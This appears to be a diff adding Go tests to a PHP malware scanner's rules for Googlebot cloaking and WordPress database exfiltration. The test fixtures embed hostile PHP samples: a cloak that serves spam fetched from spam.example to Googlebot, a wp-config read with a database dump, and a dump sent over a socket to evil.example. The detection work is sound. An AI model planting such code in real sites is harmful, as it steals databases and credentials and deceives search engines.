@@ -139,6 +139,21 @@ if ( stripos( $ua, 'Googlebot' ) !== false ) {
 	}
 }
 
+func TestSpamGooglebot_PreparedContentCloakingDetected(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	malicious := []byte(`<?php
+$ua = $_SERVER['HTTP_USER_AGENT'];
+if ( stristr( $ua, 'Googlebot' ) ) {
+	$page = file_get_contents( 'http://spam.example/links.php' );
+	print $page;
+	exit;
+}
+`)
+	if !hasRule(scanner.ScanContent(malicious, ".php"), "spam_conditional_googlebot") {
+		t.Error("spam_conditional_googlebot regression: Googlebot cloak with a prepared response before output was not detected")
+	}
+}
+
 // --- exfil_wp_db_dumper -------------------------------------------------
 
 // MainWP backup module runs mysqldump via exec to a local gzip file and lists
@@ -157,6 +172,44 @@ class MainWP_Child_DB_Backup {
 `)
 	if hasRule(scanner.ScanContent(legit, ".php"), "exfil_wp_db_dumper") {
 		t.Error("exfil_wp_db_dumper FP: matched MainWP local backup (mysqldump to a local gzip file, no exfil sink)")
+	}
+}
+
+func TestExfilDbDumper_LocalBackupManifestWriteIsNotExfil(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	legit := []byte(`<?php
+// Backup job: wp-config.php is excluded from the file archive.
+exec( "mysqldump --user={$user} --password='{$pass}' wordpress | gzip > {$gzip_full_path}", $output, $result );
+$fh = fopen( '/tmp/backup-manifest.txt', 'wb' );
+fwrite( $fh, "database backup complete" );
+fclose( $fh );
+`)
+	if hasRule(scanner.ScanContent(legit, ".php"), "exfil_wp_db_dumper") {
+		t.Error("exfil_wp_db_dumper FP: matched local backup metadata fwrite with no network or response exfil sink")
+	}
+}
+
+func TestExfilDbDumper_ConfigReadLocalDumpDetected(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	malicious := []byte(`<?php
+$cfg = file_get_contents( ABSPATH . '/wp-config.php' );
+shell_exec( "mysqldump -u" . $user . " -p" . $pass . " wordpress > /tmp/local.sql" );
+`)
+	if !hasRule(scanner.ScanContent(malicious, ".php"), "exfil_wp_db_dumper") {
+		t.Error("exfil_wp_db_dumper regression: wp-config file read followed by a local mysqldump was not detected")
+	}
+}
+
+func TestExfilDbDumper_SocketWriteDetected(t *testing.T) {
+	scanner := loadRepoScanner(t)
+	malicious := []byte(`<?php
+// wp-config.php tells the dropper which local database to steal.
+$sock = fsockopen( 'evil.example', 4444 );
+system( "mysqldump -u root -psecret wordpress > /tmp/d.sql" );
+fwrite( $sock, file_get_contents( '/tmp/d.sql' ) );
+`)
+	if !hasRule(scanner.ScanContent(malicious, ".php"), "exfil_wp_db_dumper") {
+		t.Error("exfil_wp_db_dumper regression: dump sent through a socket write was not detected")
 	}
 }
 
